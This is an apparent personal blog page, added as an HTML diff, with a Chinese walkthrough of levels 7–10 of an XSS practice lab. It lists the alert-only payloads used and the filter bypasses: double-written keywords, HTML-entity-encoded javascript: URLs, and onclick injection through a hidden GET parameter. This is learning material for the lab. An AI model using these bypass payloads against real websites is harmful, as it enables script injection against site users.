@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>xss_7~10 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="1&lt;script&gt;alert(&amp;#x27;a&amp;#x27;)&lt;&#x2F;script&gt;  1onblur&#x3D;&amp;#x27;alert(&#x2F;1&#x2F;)&amp;#x27;  1&lt;a href&#x3D;&quot;javascript:alert(&amp;#x27;a&amp;#x27;)&quot;&gt;click&lt;&#x2F;a&gt;  第七关 on script href都被过滤，变成空白，双写注入“ oonnbl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss_7~10">
+<meta property="og:url" content="http://example.com/2024/02/13/xss-7-10/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="1&lt;script&gt;alert(&amp;#x27;a&amp;#x27;)&lt;&#x2F;script&gt;  1onblur&#x3D;&amp;#x27;alert(&#x2F;1&#x2F;)&amp;#x27;  1&lt;a href&#x3D;&quot;javascript:alert(&amp;#x27;a&amp;#x27;)&quot;&gt;click&lt;&#x2F;a&gt;  第七关 on script href都被过滤，变成空白，双写注入“ oonnbl">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-02-13T08:47:46.000Z">
+<meta property="article:modified_time" content="2024-02-13T08:48:15.293Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-xss-7-10" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/02/13/xss-7-10/" class="article-date">
+  <time class="dt-published" datetime="2024-02-13T08:47:46.000Z" itemprop="datePublished">2024-02-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      xss_7~10
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;a&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onblur=&#x27;alert(/1/)&#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(&#x27;a&#x27;)&quot;&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>第七关</strong></p>
+<p>on script href都被过滤，变成空白，双写注入“ oonnblur&#x3D;’alert(&#x2F;1&#x2F;)’”</p>
+<p><strong>第八关</strong></p>
+<p>直接输入，发现输入语句出现在两个地方</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;&lt;scr_ipt&gt;alert(&#x27;a&#x27;)&lt;/scr_ipt&gt;&quot;&gt;友情链接&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;keyword&quot; value=&quot;&lt;script&gt;alert(&#x27;a&#x27;)&lt;/script&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>双引号被编码化，无法闭合</p>
+<p>因为内容在标签的属性里面，属性值可以用编码化的方式绕过</p>
+<p>编码：<br>&#x2F;&#x2F; 采用十进制ascii码<br>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#106;&amp;#97;&amp;#100;&amp;#101;&amp;#110;&amp;#34;&amp;#41;<br>&#x2F;&#x2F; 或者十六进制unicode编码<br>&amp;#x006a;&amp;#x0061;&amp;#x0076;&amp;#x0061;&amp;#x0073;&amp;#x0063;&amp;#x0072;&amp;#x0069;&amp;#x0070;&amp;#x0074;&amp;#x003a;&amp;#x0061;&amp;#x006c;&amp;#x0065;&amp;#x0072;&amp;#x0074;&amp;#x0028;&amp;#x0022;&amp;#x006a;&amp;#x0061;&amp;#x0064;&amp;#x0065;&amp;#x006e;&amp;#x0022;&amp;#x0029;</p>
+<p><strong>第九关</strong></p>
+<p>&#x2F;，&#x3D;进行了转义，使用绕过的方法无法注释掉后面</p>
+<p>写上一个正确的网址会出现在href属性里</p>
+<p>javascript:alert(“a”)&#x2F;&#x2F;<a target="_blank" rel="noopener" href="http://www.baidu.com/">http://www.baidu.com</a> 但是前面的<br>javascript:alert(“a”) &#x2F;&#x2F; 要进行编码，不然会被加上_</p>
+<p>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#106;&amp;#97;&amp;#100;&amp;#101;&amp;#110;&amp;#34;&amp;#41;&#x2F;&#x2F;<a target="_blank" rel="noopener" href="http://www.baidu.com/">http://www.baidu.com</a></p>
+<p><strong>第十关</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;t_link&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>get传递</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;t_link=a&amp;t_history=b&amp;t_sort=c</span><br></pre></td></tr></table></figure>
+
+<p>发现第三个能接收</p>
+<p>“ type&#x3D;’text’ onclick&#x3D;’alert(‘1’)’<br>成功</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/02/13/xss-7-10/" data-id="clsk4f7380005k4b58odacyjw" data-title="xss_7~10" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2024/02/13/xss4-6/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">xss4~6</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/html-css-js%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/" rel="tag">html, css, js基础学习</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/html-css-js%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/" style="font-size: 10px;">html, css, js基础学习</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/02/13/xss-7-10/">xss_7~10</a>
+          </li>
+        
+          <li>
+            <a href="/2024/02/13/xss4-6/">xss4~6</a>
+          </li>
+        
+          <li>
+            <a href="/2024/02/12/xss1-3/">xss1~3</a>
+          </li>
+        
+          <li>
+            <a href="/2024/02/11/sql16-20/">sql16~20</a>
+          </li>
+        
+          <li>
+            <a href="/2024/02/09/sql11-15/">sql11~15</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2024 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
